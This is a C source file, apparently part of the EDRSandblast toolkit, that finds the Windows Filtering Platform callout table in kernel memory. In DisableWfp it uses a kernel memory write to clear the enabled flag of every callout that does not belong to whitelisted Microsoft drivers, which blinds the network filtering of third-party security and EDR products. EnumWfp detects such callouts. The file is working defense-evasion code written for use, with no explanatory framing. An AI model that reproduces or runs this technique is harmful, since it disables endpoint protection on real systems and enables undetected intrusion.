#include "../EDRSandblast.h"
#include "IsEDRChecks.h"
#include "PdbSymbols.h"
#include "FltmgrOffsets.h"
#include "KernelMemoryPrimitives.h"
#include "KernelUtils.h"
#include "FileVersion.h"
#include "KernelCallbacks.h"

#include "MinifilterCallbacks.h"

#include "./memory.h"
#include "./symbol.h"
#include "./wfp.h"

MODULE_ID whitedModulesWfp[] = {
  MOD_ndu,
  MOD_tcpip,
  MOD_mpsdrv
};

/*
 * NETIO
 */
PCHAR exportNamesFwpk[] = {
   FOREACH_EXPORT_FWPK(STR)
};
// Subsets of id
UINT8 fwpkExports[] = { EXP_FWPK_FwpsCalloutUnregisterById0 };
// The same size of id
DWORD64 fwpkExportAddresses[EXP_FWPK_COUNT] = { 0 };

SYMBOL_META OS_10_FwppCalloutFindById = { EXP_FWPK_FwpsCalloutUnregisterById0, 0x60, 0xe8c88b4800000000, 0xffffffff00000000, 0, 0 };
PSYMBOL_META getter_FwppCalloutFindById() {
  if (BuildIDKey >= OS_10) {
    return &OS_10_FwppCalloutFindById;
  }
  return NULL;
}
SYMBOL_META OS_10_CalloutCount = { SYM_FWPK_FwppCalloutFindById, 0, 0, 0, 2, 1 };
PSYMBOL_META getter_CalloutCount() {
  if (BuildIDKey >= OS_10) {
    return &OS_10_CalloutCount;
  }
  return NULL;
}

// full of id
SYMBOL_META_POOL_ITEM symbolMetaPoolFwpk[] = {
  {
    SYM_FWPK_FwppCalloutFindById, getter_FwppCalloutFindById
  },
  {
    SYM_FWPK_CalloutCount, getter_CalloutCount
  }
};
// full of id
DWORD64 fwpkSymbolAddresses[SYM_FWPK_COUNT] = { 0 };

MODULE_PATCHED moduleFwpk = 
{ "fwpkclnt.sys", 0, 0, NULL, EXP_FWPK_COUNT, fwpkExports, exportNamesFwpk, fwpkExportAddresses, SYM_FWPK_COUNT, symbolMetaPoolFwpk, fwpkSymbolAddresses };


/*
 * NETIO
 */
PCHAR exportNamesNetio[] = {
   FOREACH_EXPORT_NETIO(STR)
};

// Subsets of id
UINT8 netioExports[] = { EXP_NETIO_FeGetWfpGlobalPtr };
// The same size of id
DWORD64 netioExportAddresses[EXP_NETIO_COUNT] = { 0 };

SYMBOL_META OS_10_gWfpGlobal = { EXP_NETIO_FeGetWfpGlobalPtr, 0, 0, 0, 3, 0 };
PSYMBOL_META getter_gWfpGlobal() {
  if (BuildIDKey >= OS_10_10240) {
    return &OS_10_gWfpGlobal;
  }

  return NULL;
}

// full of id
SYMBOL_META_POOL_ITEM symbolMetaPoolNetio[] = {
  {
    SYM_NETIO_gWfpGlobal, getter_gWfpGlobal
  }
};
// full of id
DWORD64 netioSymbolAddresses[SYM_NETIO_COUNT] = { 0 };

MODULE_PATCHED moduleNetio = 
{ "netio.sys", 0, 0, NULL, EXP_NETIO_COUNT, netioExports, exportNamesNetio, netioExportAddresses, SYM_NETIO_COUNT, symbolMetaPoolNetio, netioSymbolAddresses };

// from FeInitCalloutTable
NETIO_SETTING settingsPool[] = {
  {OS_10_10240, 0x150, 0x50},
  {OS_10_15063, 0x198, 0x50},
  {OS_10_22000, 0x1a0, 0x50}
};

BOOL WfpSetup(PSYSTEM_MODULE_INFORMATION moduleRawList) {
  BOOL rs = FALSE;
  rs |= InitPatchedModule(moduleRawList, &moduleNetio);
  rs |= InitPatchedModule(moduleRawList, &moduleFwpk);
  return rs;
}

#define OFFSET_ENABLED_FLAG 4
#define OFFSET_classifyFn 0x10
#define OFFSET_notifyFn 0x18
#define OFFSET_classifyFnFast 0x28
UINT8 offsetsFN[] = { OFFSET_classifyFn, OFFSET_notifyFn, OFFSET_classifyFnFast };
void DisableWfp() {
  PNETIO_SETTING pSettings = (PNETIO_SETTING)FindVersionedStruct((PBYTE)settingsPool, _countof(settingsPool), sizeof(NETIO_SETTING));
  DWORD64 gWfpGlobal = ReadMemoryDWORD64(netioSymbolAddresses[SYM_NETIO_gWfpGlobal]);
  UINT32 listCount = ReadMemoryDWORD(fwpkSymbolAddresses[SYM_FWPK_CalloutCount]);
  DWORD64 item = ReadMemoryDWORD64(gWfpGlobal + pSettings->listOffset);

  for (UINT32 i = 0; i < listCount; i++, item += pSettings->itemSize) {
    DWORD64 enabledAddr = item + OFFSET_ENABLED_FLAG;
    UINT32 enabled = ReadMemoryDWORD(enabledAddr);
    printf("Callout No.%x enabled [%u]\n", i, enabled);
    if (enabled) {
      DWORD64 fn = 0;
      for (UINT8 j = 0; j < _countof(offsetsFN); j++) {
        fn = ReadMemoryDWORD64(item + offsetsFN[j]);
        if (fn > 0) {
          break;
        }
      }
#ifdef _DEBUG
      BelongToDriver(fn);
#endif
      if (!IsAddressWhitelisted(whitedModulesWfp, _countof(whitedModulesWfp), fn)) {
        PatchSize(enabledAddr, (Value){ .dword = 0 }, S4);
        printf("  >>> Disabled\n");
      }
    }
  }
}

BOOL EnumWfp() {
  PNETIO_SETTING pSettings = (PNETIO_SETTING)FindVersionedStruct((PBYTE)settingsPool, _countof(settingsPool), sizeof(NETIO_SETTING));
  DWORD64 gWfpGlobal = ReadMemoryDWORD64(netioSymbolAddresses[SYM_NETIO_gWfpGlobal]);
  UINT32 listCount = ReadMemoryDWORD(fwpkSymbolAddresses[SYM_FWPK_CalloutCount]);
  DWORD64 item = ReadMemoryDWORD64(gWfpGlobal + pSettings->listOffset);

  printf("Total Callouts: %x", listCount);

  for (UINT32 i = 0; i < listCount; i++, item += pSettings->itemSize) {
    DWORD64 enabledAddr = item + OFFSET_ENABLED_FLAG;
    UINT32 enabled = ReadMemoryDWORD(enabledAddr);
    printf("Callout No.%x enabled [%u]\n", i, enabled);
    if (enabled) {
      DWORD64 fn = 0;
      for (UINT8 j = 0; j < _countof(offsetsFN); j++) {
        fn = ReadMemoryDWORD64(item + offsetsFN[j]);
        if (fn > 0) {
          break;
        }
      }
      if (!IsAddressWhitelisted(whitedModulesWfp, _countof(whitedModulesWfp), fn)) {
        return TRUE;
      }
    }
  }
  return FALSE;
}

